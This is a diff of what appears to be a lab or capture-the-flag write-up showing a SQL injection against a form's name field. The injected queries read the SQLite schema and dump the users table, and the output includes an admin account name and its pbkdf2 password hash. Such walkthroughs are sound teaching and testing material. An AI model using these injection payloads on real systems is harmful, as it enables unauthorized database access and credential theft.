@@ -25,13 +25,8 @@ Injecting: `name=test',10,(select+sql+from+sqlite_master))--+-&price=4&desc=hi`
 CREATE TABLE users ( id INTEGER NOT NULL, name VARCHAR(100), password VARCHAR(100) NOT NULL, PRIMARY KEY (id) )
 ```
 
-Injecting: `name=test',10,(select+name+from+users))--+-&price=4&desc=hi`
+Injecting: `name=test',10,(select+id||CHAR(32)||name||CHAR(32)||password+from+users+where+id=3))--+-&price=4&desc=hi`
 ```
-Joram
-```
-
-Injecting: `name=test',10,(select+password+from+users+where+name='Joram'))--+-&price=4&desc=hi`
-```
-pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
+3 website_admin_account pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
 ```
 
